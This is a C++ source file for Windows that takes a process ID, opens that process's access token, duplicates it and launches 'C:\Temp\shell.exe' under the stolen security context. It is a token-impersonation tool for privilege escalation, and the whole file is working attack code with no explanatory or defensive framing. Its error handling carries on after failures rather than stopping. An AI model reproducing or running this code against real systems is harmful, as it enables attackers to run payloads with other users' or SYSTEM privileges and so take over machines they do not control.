#include <windows.h>
#include <iostream>
#include <tchar.h>

int main(int argc, char* argv[]) {

	DWORD pid = atoi(argv[1]); //PID of target process as input
	wchar_t command[] = L"C:\\Temp\\shell.exe"; //Path to executable file

	//OpenProcess
	HANDLE processHandle;
	processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, pid);
	if (!processHandle)
	{
		_tprintf(L"Cannot Open Process. Failed with Error Code: %d\n", GetLastError());
		CloseHandle(processHandle);
	}

	//OpenProcessToken
	HANDLE tokenHandle = NULL;
	if (!OpenProcessToken(processHandle, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
	{
		_tprintf(L"Cannot Open Process Token. Failed with Error Code: %d\n", GetLastError());
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
	}

	//Duplicate the primary token
	HANDLE duplicateTokenHandle = NULL;
	if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle))
	{
		_tprintf(L"Cannot Duplicate Token. Failed with Error Code: %d\n", GetLastError());
		CloseHandle(tokenHandle);
		CloseHandle(duplicateTokenHandle);
	}

	//Create new process with a different security context
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessWithTokenW(duplicateTokenHandle, 0, NULL, command, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		_tprintf(L"Cannot Create Process With Token. Failed with Error Code: %d\n", GetLastError());
		CloseHandle(duplicateTokenHandle);
	}
	else { _tprintf(L"Process successfully created..."); }

	return 0;
}